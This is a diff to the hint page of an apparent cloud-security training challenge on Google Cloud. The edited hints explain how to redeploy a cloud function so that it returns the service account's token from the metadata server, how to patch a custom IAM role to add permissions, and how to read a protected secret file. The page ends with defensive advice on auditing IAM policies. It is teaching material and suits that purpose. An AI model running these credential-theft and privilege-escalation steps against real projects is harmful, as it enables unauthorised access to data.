@@ -70,12 +70,14 @@ which is located in a file called secret.txt in a private bucket on the project.
       <span>Hint 3</span>
       <p>List the cloud functions in the project:</p>
       <pre>gcloud functions list</pre>
+      <p>Then, get more information about the function that you find, including its httpsTrigger:</p>
+      <pre>gcloud functions describe [function]</pre>
     </li>
     
     <li>
       <span>Hint 4</span>
-      <p>Try calling the function using the service account's access token:</p>
-      <pre>curl https://[location]-[project-id].cloudfunctions.net/[function-name] -H "Authorization: Bearer $(gcloud auth print-identity-token)"</pre>
+      <p>Try calling the function using the service account's token:</p>
+      <pre>curl [httpsTrigger] -H "Authorization: Bearer $(gcloud auth print-identity-token)"</pre>
     </li>
     
     <li>
@@ -86,7 +88,7 @@ which is located in a file called secret.txt in a private bucket on the project.
     <li>
       <span>Hint 6</span>
       <p>Modify the function's code using:</p>
-      <pre>gcloud functions deploy [function-name] --source=[path/to/code]</pre>
+      <pre>gcloud functions deploy [function] --source=[path/to/code]</pre>
       <p>Information on how to write cloud functions can be found <a class="inline" href="https://cloud.google.com/functions/docs/writing/http#writing_http_helloworld-python">here</a>, and information on how to use libraries can be found <a class="inline" href="https://cloud.google.com/functions/docs/writing/specifying-dependencies-python">here</a>.</p>
     </li>
     
@@ -102,7 +104,7 @@ which is located in a file called secret.txt in a private bucket on the project.
     
     <li>
       <span>Hint 9</span>
-      <p>The url to get an access token from the metadata server is http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</p>
+      <p>The URL to get an access token from the metadata server is http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</p>
       <p>To have the function return the access token, create the following files:</p>
       <h3>function/main.py</h3>
       <pre>import requests
@@ -114,7 +116,7 @@ def main(request):
       <h3>function/requirements.txt</h3>
       <pre>requests</pre>
       <p>Deploy the new code:</p>
-      <pre>gcloud functions deploy [function-name] --source=./function</pre>
+      <pre>gcloud functions deploy [function] --source=./function --trigger-http --runtime=python38</pre>
       <p>Then, call the function to get its access token.</p>
     </li>
     
@@ -163,7 +165,7 @@ def main(request):
       <span>Hint 17</span>
       <p>Query the API, making sure to put role-name in the same format as it was in the IAM policy: "projects/[project-id]/roles/[role-id]"</p>
       <textarea style="min-height: 15.6em">curl --request PATCH \
-    'https://iam.googleapis.com/v1/projects/[PROJECT-ID/roles/[ROLE-NAME]?updateMask=includedPermissions' \
+    'https://iam.googleapis.com/v1/projects/[PROJECT-ID]/roles/[ROLE-ID]?updateMask=includedPermissions' \
     --header 'Authorization: Bearer [ACCESS-TOKEN]' \
     --header 'Accept: application/json' \
     --header 'Content-Type: application/json' \
@@ -179,7 +181,7 @@ def main(request):
     
     <li>
       <span>Hint 18</span>
-      <p>Now that you have permission to view and list buckets and objects, find secret.txt.</p>
+      <p>Now that you have permission to view and list buckets and objects, find secret.txt. Note that you may need to re-activate the initial service account credential to refresh the access token with the new permissions you set.</p>
     </li>
     
     <li>
@@ -203,6 +205,7 @@ cat secret.txt</pre>
   never be given to such a function and it is a good idea to audit all IAM policies for correctness continuously to ensure such patches are detected.
   Patching privileges allows the adversary to grant him/herself the privileges required to access any project resource (such as objects in a restricted
   storage bucket).</p>
+
   </div>
 
   <script src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
